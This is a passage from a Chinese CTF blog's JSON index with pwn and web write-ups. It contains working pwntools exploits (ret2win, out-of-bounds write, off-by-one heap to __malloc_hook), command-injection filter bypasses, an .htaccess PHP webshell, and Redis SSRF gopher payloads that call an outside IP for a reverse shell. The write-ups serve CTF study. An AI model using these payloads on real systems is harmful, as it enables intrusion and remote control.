flag.txt&quot;);&#125;\n\n所以他给了我们拿到flag的地址，只需要通过gets函数改变rip寄存器，跳转到这个函数就可以得到flag\n\n我们上面输入的是aaaa对应的，所以根据函数栈的机制就可以找到偏移量为0x48\n然后直接写exp吧\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/warmup_csaw_2016&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29330)get_flag_addr = 0x40060dpayload = b&#x27;a&#x27;*(0x48) + p64(get_flag_addr)r.sendline(payload)r.interactive()\n\n\n拿到flag!\n","categories":["pwn-buuctf"],"tags":["pwn"]},{"title":"web_command_execution","url":"/2021/09/23/web-command-execution/","content":";     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）\n\n\n\n\n空格绕过\n\n$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\\x09./flag.php&#x27;;$X       （\\x09表示tab，也可以用\\x20）\n\n\n\n在命令执行时，需要绕过空格使用&lt;/符号\ncat&lt;/flagcat&lt;/home/tcdy/duyu/test.php\n\n\n绕过黑名单\n\n┌──(tcdy㉿Debian)-[~]└─$ a=f;b=l;c=a;d=g                                                                                                                                                                                                                                    ┌──(tcdy㉿Debian)-[~]└─$ cat $a$b$c$d   this is a test                                                                                                                                                                                                                                            ┌──(tcdy㉿Debian)-[~]└─$ cat flag    this is a test\n\n这次攒的不多\n","categories":["web"],"tags":["命令执行"]},{"title":"xctf_stack2","url":"/2021/09/24/xctf-stack2/","content":"程序的保护与流程\n保护几乎全开了，直接看程序执行流程\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  unsigned int v5; // [esp+18h] [ebp-90h]  unsigned int v6; // [esp+1Ch] [ebp-8Ch]  int v7; // [esp+20h] [ebp-88h]  unsigned int j; // [esp+24h] [ebp-84h]  int v9; // [esp+28h] [ebp-80h]  unsigned int i; // [esp+2Ch] [ebp-7Ch]  unsigned int k; // [esp+30h] [ebp-78h]  unsigned int l; // [esp+34h] [ebp-74h]  char v13[100]; // [esp+38h] [ebp-70h]  unsigned int v14; // [esp+9Ch] [ebp-Ch]  v14 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  v9 = 0;  puts(&quot;***********************************************************&quot;);  puts(&quot;*                      An easy calc                       *&quot;);  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);  puts(&quot;*(0 &lt;= x &lt; 256)                                           *&quot;);  puts(&quot;***********************************************************&quot;);  puts(&quot;How many numbers you have:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v5);  puts(&quot;Give me your numbers&quot;);  for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i )  &#123;    __isoc99_scanf(&quot;%d&quot;, &amp;v7);    v13[i] = v7;  &#125;  for ( j = v5; ; printf(&quot;average is %.2lf\\n&quot;, (double)((long double)v9 / (double)j)) )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          puts(&quot;1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v6);          if ( v6 != 2 )            break;          puts(&quot;Give me your number&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v7);          if ( j &lt;= 0x63 )          &#123;            v3 = j++;            v13[v3] = v7;          &#125;        &#125;        if ( v6 &gt; 2 )          break;        if ( v6 != 1 )          return 0;        puts(&quot;id\\t\\tnumber&quot;);        for ( k = 0; k &lt; j; ++k )          printf(&quot;%d\\t\\t%d\\n&quot;, k, v13[k]);      &#125;      if ( v6 != 3 )        break;      puts(&quot;which number to change:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v5);      puts(&quot;new number:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v7);      v13[v5] = v7;    &#125;    if ( v6 != 4 )      break;    v9 = 0;    for ( l = 0; l &lt; j; ++l )      v9 += v13[l];  &#125;  return 0;&#125;\n\n流程主要就是，选择你要往数组里面加几个数字，然后输入，然后有四个选项，分别是，查看数字，添加数字，改变数字，获得平均数，最后就是结束。\n分析漏洞浏览全篇没有read和gets等函数来实现栈溢出，再就是有Canary保护。\n漏洞位置:\nputs(&quot;which number to change:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v5);puts(&quot;new number:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v7);\n\n找到偏移量这里没有限制数组的边境，就可以造成任意地址更改的漏洞。\n\n静态调试的时候会的出偏移量是0x74，但是这样直接跑就出错了。\nemmm我也不知道为什么，后面看了博客，发现要找到数组的起始地址和ret地址\n\n函数在执行到v13[v5]=v7的时候就是上面的汇编代码。整个执行流程就是，\nscanf的时候就将数据存在栈上面，然后把数据放到EDX寄存器，再把DL的数据放到ebp+eax-0x70的位置，也就是栈上面。然后就是找ret函数\n\n执行到ret，所以此时的rsp就是ret的地址\nemmmL:开始一直没想清楚为什么会出现ret地址不是ebp+4，很多博客都没写清楚，问了学长那态度问过的都知道。\nhttps://muzibing.github.io/2020/06/08/2020.06.08(123)/\n这个博主解释了，是因为开启了canary的缘故\n解决完这个难题后面就简单了，题目有一个欺骗人的函数hackhere里面的参数是’/bin/bash’所以get不到shell，然后就直接自己构造吧。\ngetshell直接上exp\nfrom platform import systemfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 53021)# r = process(&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;)system_addr = [0x50, 0x84, 0x04, 0x08]sh_addr = [0x87, 0x89, 0x04, 0x08]offset = 0x84r.recvuntil(b&#x27;How many numbers you have:\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Give me your numbers\\n&#x27;)r.sendline(b&#x27;1&#x27;)def attack(addr, value):    r.recvuntil(b&#x27;5. exit\\n&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;which number to change:\\n&#x27;)    r.sendline(str(addr).encode(&#x27;utf8&#x27;))    r.recvuntil(b&#x27;new number:\\n&#x27;)    r.sendline(str(value).encode(&#x27;utf8&#x27;))for i in range(4):    attack(offset+i, system_addr[i])offset += 8for j in range(4):    attack(offset+j, sh_addr[j])r.recvuntil(b&#x27;5. exit\\n&#x27;)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["ROP| stack overflow"]},{"title":"关于.htaccess的技巧记录","url":"/2021/10/30/%E5%85%B3%E4%BA%8E-htaccess%E7%9A%84%E6%8A%80%E5%B7%A7%E8%AE%B0%E5%BD%95/","content":"百度词条.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。\n相关的基础概念.htaccess当中的注释，#是单行注释，并且\\可以拼接两行\n作用范围：.htaccess作用于当前目录和他的所有子目录\n在使用.htaccess的时候需要apache配置文件中ALLowOverride All当然还可以重命名AccessFileName .config\n.htaccess指令SetHandler强制所有匹配文件被指定处理器处理\nAddType application/x-httpd-php .gifSetHandler handler-name|None\n\n在CTF常用用法：\nSethandler application/x-httpd-php\n\n那么当前目录下以及子目录的所有文件都会被当作php执行\nAddType将指定的文件尾缀映射到制定内容的类型\nAddType media-type extensive [extensive] ...\n\nCTF的常用用法：\nAddType application/x-httpd-php .gif\n\n此时会将.gif的文件当作php被执行\nphp_value当使用 PHP 作为 Apache 模块时，可以用 Apache 的配置文件（例如 httpd.conf）或 .htaccess 文件中的指令来修改 PHP 的配置设定。但是需要有开启 AllowOverride Options 或 AllowOverride All 权限才可以。\nphp_value 指令用来设定指定的 PHP 的配置值。要清除先前设定的值，把 value 设为 none。但是 php_value 不能用来设定布尔值，如果要设定布尔值的话应该用 php_flag。\nphp_value name value\n\n\n在php官网有能够在.htaccess设定的内容，所以只有PHP_INI_PREDIR和PHP_INI_ALL才能被.htaccess设定\n在CTF中常用\nphp_value auto_prepend_file image.png\n\n在访问一个php文件会在访问之前包含image.png文件\nphp_flag用来设定bool类型的配置项\nphp_flag name on|off\n\nCTF常用\nphp_flag engine 0\n\n造成源码泄漏\n例题[羊城杯 2020]easy php题目源码index.php:\n&lt;?php$files = scandir(&#x27;./&#x27;);foreach ($files as $file) &#123;    if (is_file($file)) &#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;if (!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;    highlight_file(__FILE__);    die();&#125;$content = $_GET[&#x27;content&#x27;];if (stristr($content, &#x27;on&#x27;) || stristr($content, &#x27;html&#x27;) || stristr($content, &#x27;type&#x27;) || stristr($content, &#x27;flag&#x27;) || stristr($content, &#x27;upload&#x27;) || stristr($content, &#x27;file&#x27;)) &#123;    echo &quot;Hacker&quot;;    die();&#125;$filename = $_GET[&#x27;filename&#x27;];if (preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;    echo &quot;Hacker&quot;;    die();&#125;$files = scandir(&#x27;./&#x27;);foreach ($files as $file) &#123;    if (is_file($file)) &#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($filename, $content . &quot;\\nHello, world&quot;);\n\n在访问文件的时候会先把当前文件夹下的所有文件都删除了，然后可以上传content和filename，但是当你上传一个一句话木马的时候会发现这个文件没法解析，所以考虑使用.htaccess文件\n直接写出payload\nphp_value auto_prepend_fil\\ e .htaccess #&lt;?php system($_POST[1]);die();?&gt;\\ \n\n\n\n","categories":["web"],"tags":[".htaccess"]},{"title":"网鼎杯_2020_玄武组_SSRFMe","url":"/2021/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/","content":"题目源码&lt;?phpfunction check_inner_ip($url)&#123;    $match_result=preg_match(&#x27;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#x27;,$url);    if (!$match_result)    &#123;        die(&#x27;url fomat error&#x27;);    &#125;    try    &#123;        $url_parse=parse_url($url);    &#125;    catch(Exception $e)    &#123;        die(&#x27;url fomat error&#x27;);        return false;    &#125;    $hostname=$url_parse[&#x27;host&#x27;];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;&#125;function safe_request_url($url)&#123;    if (check_inner_ip($url))    &#123;        echo $url.&#x27; is inner ip&#x27;;    &#125;    else    &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info[&#x27;redirect_url&#x27;])        &#123;            safe_request_url($result_info[&#x27;redirect_url&#x27;]);        &#125;        curl_close($ch);        var_dump($output);    &#125;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = $_GET[&#x27;url&#x27;];    if(!empty($url))&#123;        safe_request_url($url);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;// Please visit hint.php locally.?&gt;\n\n在这里只允许使用http/https/gopher/dict协议，并且禁止了一些ip，查看hint很简单，直接0.0.0.0就行\nstring(1342) &quot; &lt;?phpif($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123;  highlight_file(__FILE__);&#125;if(isset($_POST[&#x27;file&#x27;]))&#123;  file_put_contents($_POST[&#x27;file&#x27;],&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;.$_POST[&#x27;file&#x27;]);&#125;&quot;\n\n返回了这样的数据，直接写了redis的密码是root，又有gopher协议，思路就清晰了。\n利用思路构造一个恶意的redis服务器https://github.com/xmsec/redis-ssrf然后让远程的redis连接到恶意的redis服务器，紧接着远程主机会同步恶意主机的exp，然后控制主机连接本地监听就可以getshell了\ngopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquitgopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520103.215.81.199%252010977%250d%250aquit\n\n第一步是将dir设置为/tmp/，第二步是将dbfilename设置为exp.so然后设置连接到我们的服务\ngopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%2520103.215.81.199%252010232%250d%250aquit\n\n这一步是让目标主机使用这个应用这个exp文件然后远程连接我们的服务\n\n这样就获得了反弹shell，穷困大学生没有服务器就用的隧道来代替\n","categories":["web-buuctf"],"tags":["ssrf|redis主从复制"]},{"title":"网鼎杯_2020_青龙组_notes","url":"/2021/11/22/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/","content":"知识点源代码中undefsafe不知道是什么搜了一下就出现了unsafe漏洞\nhttps://skysec.top/2020/06/22/CVE-2019-10795-undefsafe-Prototype-Pollution-Vulnerability/\n// 上面链接里面的内容var a = require(&quot;undefsafe&quot;);var test = &#123;&#125;console.log(&#x27;this is &#x27;+test)// this is [object Object]a(test,&#x27;__proto__.toString&#x27;,function()&#123; return &#x27;just a evil!&#x27;&#125;)console.log(&#x27;this is &#x27;+test)// this is just a evil!\n\n代码审计题目直接给了源码\nvar express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);const undefsafe = require(&#x27;undefsafe&#x27;);const &#123; exec &#125; = require(&#x27;child_process&#x27;);var app = express();class Notes &#123;    constructor() &#123;        this.owner = &quot;whoknows&quot;;        this.num = 0;        this.note_list = &#123;&#125;;    &#125;    write_note(author, raw_note) &#123;        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;    &#125;    get_note(id) &#123;        var r = &#123;&#125;        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    &#125;    edit_note(id, author, raw) &#123;        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);    &#125;    get_all_notes() &#123;        return this.note_list;    &#125;    remove_note(id) &#123;        delete this.note_list[id];    &#125;&#125;var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);&#125;);app.route(&#x27;/add_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);    &#125;)    .post(function(req, res) &#123;        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) &#123;            notes.write_note(author, raw);            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/edit_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/delete_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        if (id) &#123;            notes.remove_note(id);            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/notes&#x27;)    .get(function(req, res) &#123;        let q = req.query.q;        let a_note;        if (typeof(q) === &quot;undefined&quot;) &#123;            a_note = notes.get_all_notes();        &#125; else &#123;            a_note = notes.get_note(q);        &#125;        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);    &#125;)app.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)app.use(function(req, res, next) &#123;  res.status(404).send(&#x27;Sorry cant find that!&#x27;);&#125;);app.use(function(err, req, res, next) &#123;  console.error(err.stack);  res.status(500).send(&#x27;Something broke!&#x27;);&#125;);const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))\n\n可以看到漏洞函数很明显\nedit_note(id, author, raw) &#123;    undefsafe(this.note_list, id + &#x27;.author&#x27;, author);    undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);&#125;\n\n并且三个参数都是可控的，所以可以造成原型链污染\napp.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)\n\n然后这里又是for循环执行命令\n利用过程其实思路就很明显了，污染commands然后执行我们想要的命令就可以了\n\n就可以获得反弹shell了\n","categories":["web-buuctf"],"tags":["代码审计|原型链污染"]},{"title":"长安“战疫”网络安全卫士守护赛wp","url":"/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/","content":"总的来说比赛挺简单的，因为pwn2没遇到过所以调试花费的时间比较多，没来的及做pwn3，不过pwn3看了好像是存在任意地址写漏洞，猜测是修改exit的got表之类的，后面复现了再发(当然有可能因为太懒不发了)。\npwn1add esp, 10hmov eax, 0mov ecx, [ebp+var_4]leavelea esp,[ecx-4]retn\n\n注意程序不是从原本的位置开始ret就好了\nfrom pwn import *elf = ELF(&#x27;./pwn1&#x27;)# r = process(&#x27;./pwn1&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16088)shell_addr = 0x8048540r.recvuntil(b&#x27;Gift:&#x27;)buf_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True)[2:], 16)payload = b&#x27;a&#x27;*(0x38-0x4)+p32(buf_addr+0x38+8)+p32(0)+p32(shell_addr)# r.sendline(b&#x27;a&#x27;*(0x38+0x4))r.sendline(payload)r.interactive()\n\npwn2off by one程序在create的时候存在off by one漏洞，具体思路，覆盖下方chunk，释放chunk进入unsortedbin泄漏main_arena，释放chunk进入tcache修改到malloc上面的地址\nfrom pwn import *elf = ELF(&#x27;./pwn2&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)# r = process(&#x27;./pwn2&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16066)context.log_level = &#x27;debug&#x27;one_gadget = 0x10a41cdef create(size, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def edit(id, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def delete(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def show(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x68)    # 0create(0x100, b&#x27;a&#x27;*0x100)  # 1create(0x68, b&#x27;a&#x27;*0x68)    # 2create(0x88, b&#x27;a&#x27;*0x88)    # 3create(0xf8, b&#x27;a&#x27;*0xf8)    # 4create(0x88, b&#x27;a&#x27;*0x88)    # 5# delete(9)delete(0)create(0x68, b&#x27;a&#x27;*(0x68-0x8)+p64(0)+b&#x27;\\x80&#x27;)  # 0# 让chunk1覆盖掉chunk2delete(1)create(0x170, b&#x27;a&#x27;)  # 1delete(3)create(0x88, b&#x27;a&#x27;*(0x88-0x8)+p64(0)+b&#x27;\\x90&#x27;)  # 3delete(4)# chunk4覆盖掉chunk5create(0x180, b&#x27;a&#x27;)  # 4for i in range(7):    create(0x88, b&#x27;a&#x27;)for i in range(7):    delete(12-i)delete(5)# 让chunk5进入unsortedbin获得main_arena地址edit(4, b&#x27;a&#x27;*(0xf8+0x8-1))show(4)r.recvuntil(b&#x27;aaaaaaaaaaaaaa\\n&#x27;)main_arena_88 = u64(r.recvuntil(b&#x27;1.Add&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+one_gadgetdelete(2)edit(1, b&#x27;a&#x27;*(0x100)+p64(0)+p64(0x70)+p64(malloc_hook-0x10))  # 2# 释放chunk2，进入tcache，修改fd指针create(0x68, b&#x27;a&#x27;)# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x10+p64(one_gadget))# 修改malloc_hookr.recvuntil(b&#x27;Choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size: &#x27;)r.sendline(b&#x27;1&#x27;)# getshellr.interactive()\n\n自己还是在常见的漏洞上面出现问题比如这次的off by one还有off by null都还没去了解，所以下来会去了解这方面的漏洞原理和利用方式。\n","categories":["比赛wp"],"tags":["pwn"]}]